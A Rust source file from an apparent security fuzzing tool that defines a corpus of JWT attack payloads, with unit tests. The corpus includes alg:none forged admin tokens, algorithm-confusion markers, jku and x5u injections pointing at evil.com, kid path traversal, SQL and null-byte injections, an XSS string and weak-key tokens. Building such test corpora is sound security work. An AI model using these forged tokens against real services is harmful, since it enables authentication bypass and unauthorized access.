//! Static JWT attack payloads: `alg:none` bypasses, RS-to-HS algorithm
//! confusion, `jku` key injection, and expiry bypasses.
//!
//! These are **data**, pre-encoded with base64url where a forged token is
//! needed. The JWT *prober* — `JwtFuzzer`, `brute_force_weak_key`, and the
//! live `reqwest` replay methods — stays in the `eggsec` engine, in
//! `eggsec::fuzzer::payloads::jwt`.

use super::{Payload, PayloadType, Severity};
use base64::engine::general_purpose::URL_SAFE_NO_PAD;

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let none_alg_header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"none","typ":"JWT"}"#);
    let payload = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);

    // 1. none algorithm bypass
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: format!("{}.{}.", none_alg_header, payload),
        description: "JWT none algorithm bypass".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "bypass".to_string()],
    });

    // 2. HS256 algorithm confusion
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "alg=HS256".to_string(),
        description: "Algorithm confusion RS256->HS256".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
    });

    // 3. HS384 algorithm confusion
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "alg=HS384".to_string(),
        description: "Algorithm confusion RS384->HS384".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
    });

    // 4. HS512 algorithm confusion
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "alg=HS512".to_string(),
        description: "Algorithm confusion RS512->HS512".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
    });

    // 5. none uppercase
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"NONE","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.", header, body),
            description: "JWT NONE algorithm uppercase bypass".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "bypass".to_string()],
        });
    }

    // 6. none mixed case
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"None","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.", header, body),
            description: "JWT None mixed case algorithm bypass".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "bypass".to_string()],
        });
    }

    // 7. exp=0 bypass
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "exp=0".to_string(),
        description: "JWT exp=0 expiration bypass".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "jwt".to_string(),
            "expiration".to_string(),
            "bypass".to_string(),
        ],
    });

    // 8. nbf far future
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "nbf=9999999999".to_string(),
        description: "JWT nbf far future not-before bypass".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "jwt".to_string(),
            "claims".to_string(),
            "bypass".to_string(),
        ],
    });

    // 9. missing exp claim
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: r#"{"sub":"admin"}"#.to_string(),
        description: "JWT missing exp claim".to_string(),
        severity: Severity::Medium,
        tags: vec!["jwt".to_string(), "claims".to_string()],
    });

    // 10. jku header injection
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "jku=https://evil.com/jwks.json".to_string(),
        description: "JKU header injection".to_string(),
        severity: Severity::High,
        tags: vec!["jwt".to_string(), "injection".to_string()],
    });

    // 11. jku well-known endpoint
    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "jku=https://evil.com/.well-known/jwks.json".to_string(),
        description: "JKU well-known endpoint injection".to_string(),
        severity: Severity::High,
        tags: vec!["jwt".to_string(), "injection".to_string()],
    });

    // 12. x5c header injection
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","x5c":["<script>alert(1)</script>"]}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "X5C header injection with XSS payload".to_string(),
            severity: Severity::High,
            tags: vec![
                "jwt".to_string(),
                "injection".to_string(),
                "xss".to_string(),
            ],
        });
    }

    // 13. kid path traversal
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","kid":"../../etc/passwd"}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "KID path traversal to read /etc/passwd".to_string(),
            severity: Severity::High,
            tags: vec![
                "jwt".to_string(),
                "injection".to_string(),
                "path_traversal".to_string(),
            ],
        });
    }

    // 14. kid null byte injection
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","kid":"good-key\u0000../../etc/passwd"}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "KID null byte injection for key path bypass".to_string(),
            severity: Severity::High,
            tags: vec![
                "jwt".to_string(),
                "injection".to_string(),
                "null_byte".to_string(),
            ],
        });
    }

    // 15. kid SQL injection
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","kid":"' OR '1'='1"}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "KID SQL injection in header".to_string(),
            severity: Severity::High,
            tags: vec![
                "jwt".to_string(),
                "injection".to_string(),
                "sqli".to_string(),
            ],
        });
    }

    // 16. jwk embedded key
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","jwk":{"kty":"oct","k":"dGVzdA=="}}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "JWK embedded public key injection".to_string(),
            severity: Severity::High,
            tags: vec![
                "jwt".to_string(),
                "injection".to_string(),
                "jwk".to_string(),
            ],
        });
    }

    // 17. x5u URL injection
    {
        let header = base64::Engine::encode(
            &URL_SAFE_NO_PAD,
            r#"{"alg":"RS256","typ":"JWT","x5u":"https://evil.com/cert.pem"}"#,
        );
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "X5U URL injection for certificate redirect".to_string(),
            severity: Severity::High,
            tags: vec!["jwt".to_string(), "injection".to_string()],
        });
    }

    // 18. null header (empty body)
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, "{}");
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin"}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.sig", header, body),
            description: "JWT null/empty header".to_string(),
            severity: Severity::High,
            tags: vec!["jwt".to_string(), "malformed".to_string()],
        });
    }

    // 19. weak signing key - secret
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.secret", header, body),
            description: "Weak signing key: secret".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 20. weak signing key - password
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.password", header, body),
            description: "Weak signing key: password".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 21. weak signing key - 123456
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.123456", header, body),
            description: "Weak signing key: 123456".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 22. weak signing key - admin
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.admin", header, body),
            description: "Weak signing key: admin".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 23. weak signing key - test
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.test", header, body),
            description: "Weak signing key: test".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 24. weak signing key - changeme
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.changeme", header, body),
            description: "Weak signing key: changeme".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    // 25. weak signing key - key
    {
        let header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"HS256","typ":"JWT"}"#);
        let body = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);
        payloads.push(Payload {
            payload_type: PayloadType::Jwt,
            payload: format!("{}.{}.key", header, body),
            description: "Weak signing key: key".to_string(),
            severity: Severity::Critical,
            tags: vec!["jwt".to_string(), "weak_key".to_string()],
        });
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty_and_labelled() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Jwt);
            assert!(!p.payload.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    /// The `alg:none` payload must stay a syntactically valid forged token:
    /// three dot-separated segments with an empty signature.
    #[test]
    fn none_algorithm_payload_is_a_well_formed_forged_token() {
        let none_payload = get_payloads()
            .into_iter()
            .find(|p| p.description.contains("none algorithm bypass"))
            .expect("the alg:none bypass must be in the corpus");
        assert_eq!(
            none_payload.severity,
            Severity::Critical,
            "an alg:none bypass is a full authentication bypass"
        );
        let parts: Vec<&str> = none_payload.payload.split('.').collect();
        assert_eq!(parts.len(), 3, "a JWT must have three segments");
        assert!(parts[2].is_empty(), "the alg:none signature must be empty");
        assert!(!parts[0].is_empty() && !parts[1].is_empty());
    }

    #[test]
    fn contains_algorithm_confusion_payloads() {
        let payloads = get_payloads();
        for alg in ["HS256", "HS384", "HS512"] {
            assert!(
                payloads.iter().any(|p| p.payload == format!("alg={alg}")),
                "missing algorithm-confusion payload for {alg}"
            );
        }
    }
}
